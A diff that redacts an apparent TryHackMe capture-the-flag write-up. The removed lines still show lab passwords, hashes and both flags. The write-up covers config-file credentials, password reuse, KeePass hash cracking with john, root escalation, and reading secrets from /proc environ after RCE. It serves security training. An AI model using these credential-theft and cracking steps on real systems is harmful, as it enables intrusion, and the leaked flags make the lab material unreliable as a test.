@@ -517,7 +517,7 @@ session_lifetime = 1800
 # TODO: migrate to secrets manager before Q2 audit
 [backup_agent]
 run_as   = sysadmin
-password = S3cur3Backup$Acc3ss!
+password = <Where password would appear>
 
 [smtp]
 host = 127.0.0.1
@@ -530,7 +530,7 @@ BINGO! we have credentials:
 ```txt
 [backup_agent]
 run_as   = sysadmin
-password = S3cur3Backup$Acc3ss!
+password = <Where password would appear>
 ```
 
 # Confirming the vulnerabilities in the source
@@ -606,16 +606,16 @@ So the *cookie-forgery* road wasn't closed - it just needed one extra step: read
 From the `netops.db` dump, the `users` table holds a single real user:
 
 ```
-netops   b9b3917940feb033ae62c693d3967ba4   operator
+netops   <Where hash would appear>   operator
 ```
 
 And `init_db()` shows how that value was built:
 
 ```python
-pw = hashlib.md5(b"C0rp$N3tS3cur3!").hexdigest()   # -> b9b3917940feb033ae62c693d3967ba4
+pw = hashlib.md5(b"<Where password would appear>").hexdigest()
 ```
 
-So the stored secret is **unsalted MD5** of `C0rp$N3tS3cur3!` - trivially crackable. But there is only **one** real user, which is exactly why dumping the table was never worth it and the auth-bypass was the sensible route.
+So the stored secret is **unsalted MD5** of `<Where password would appear>` - trivially crackable. But there is only **one** real user, which is exactly why dumping the table was never worth it and the auth-bypass was the sensible route.
 # SSH access
 Using the newly found credentials, let's test the SSH access:
 
@@ -656,8 +656,8 @@ The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
 Last login: Tue May 19 03:18:19 2026 from 192.168.230.214
-
 ```
+
 ```bash
 # Check whoami
 whoami
@@ -683,7 +683,7 @@ drwx------ 2 sysadmin sysadmin 4096 May 19 03:36 backups
 
 ```bash
 cat user.txt 
-THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}
+THM{sQli_...}
 ```
 
 BINGO! we have found the first flag!
@@ -765,7 +765,7 @@ keepassxc infrastructure.kdbx
 ```
 
 ### Password re-using
-Reusing the password of the `sysadmin`:  `S3cur3Backup$Acc3ss!`:
+Reusing the password of the `sysadmin`:  `<Where password would appear>`:
 
 >[!Note] Concept
 >Password reuse is a good idea to try. Most weaknesses are the result of password resuse
@@ -792,7 +792,7 @@ keepass2john infrastructure.kdbx > kdbx.hash
 
 # Confirm it has correct format
 cat kdbx.hash 
-infrastructure:$keepass$*4*15000*c9d9f39a*0*0*0*dfac336bd70871c277c36e2781cd90901482db105cf2c1f722552d225c7e0ed8*e180d085066b96631eb591d40eedbf19a2d2bee3eeb0ee50436c3ad04e4715fe*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000dfac336bd70871c277c36e2781cd90901482db105cf2c1f722552d225c7e0ed80b5d00000000014205000000245555494410000000c9d9f39a628a4460bf740d08c18a4fea05010000005208000000983a00000000000042010000005320000000e180d085066b96631eb591d40eedbf19a2d2bee3eeb0ee50436c3ad04e4715fe00071000000091f1c654c0458114b257c21663ffbee100040000000d0a0d0a*454008e91387390a7ccfbd081acb83d5248d9ea5ee44789f8edc2f4e12779972
+infrastructure:$keepass$*4*15000*c9d9f39a*0*0*0*dfa...
 ```
 
 crack the password:
@@ -807,13 +807,13 @@ Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
 Will run 2 OpenMP threads
 Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
 Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
-spring           (infrastructure)     
+<Where password would appear>           (infrastructure)     
 1g 0:00:00:00 DONE (2026-11-01 11:53) 1.136g/s 2870p/s 2870c/s 2870C/s spring..malcolm
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-BINGO! we have the password: `spring`
+BINGO! we have the password: `<Where password would appear>`
 
 ## Open the file
 ```bash
@@ -826,14 +826,12 @@ keepassxc infrastructure.kdbx
 
 ## Grab the root user password
 
-![[silent_monitor_10.png]]
-
-`S3cur3P4ss0nK33p4ss`
+Double click on the Root password and grab it from there.
 
 # Escalate to root
 ```
 su - root
-Password: S3cur3P4ss0nK33p4ss
+Password: <Where password would appear>
 ```
 
 ``` bash
@@ -862,10 +860,10 @@ drwxr-xr-x 19 root root 4096 Nov  1 09:19 ..
 
 ```bash
 cat root.txt 
-THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
+THM{KDBx_...}
 ```
 
-We have the second flag: `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`
+We have the second flag: `THM{KDBx_...}`
 
 
 # Methodology
@@ -882,4 +880,4 @@ We have the second flag: `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`
 - **Brute force**: In the `/internal` without a valid username, this would have wasted time.
 - Reverse shell: In the "Host Health Check". It may have been possible, but there was an easier way.
 - **cookie forgery.** The session cookie decoded to `{"role":"operator","user":"netops"}`. The source shows the signing key is read from the `FLASK_SECRET` env var, so forging `role=admin` with `flask-unsign` was possible only after leaking that env (e.g. `cat /proc/<pid>/environ`) via the RCE. A clean alternative, but an extra step we didn't need.
-- **SQLi data extraction.** A `UNION`-based dump is explicitly blocked on the login fields (`BLOCK_RE` filters `union select`), and the `users` table holds only one real account (`netops`, unsalted MD5 of `C0rp$N3tS3cur3!`). So extraction was both harder and pointless here - the auth-bypass was the right route. (The `jmartin` / `svc-mon` names in the dashboard turned out to be hardcoded `FAKE_AUDIT` props.)
+- **SQLi data extraction.** A `UNION`-based dump is explicitly blocked on the login fields (`BLOCK_RE` filters `union select`), and the `users` table holds only one real account (`netops`, unsalted MD5 of `<Where password would appear>`). So extraction was both harder and pointless here - the auth-bypass was the right route. (The `jmartin` / `svc-mon` names in the dashboard turned out to be hardcoded `FAKE_AUDIT` props.)
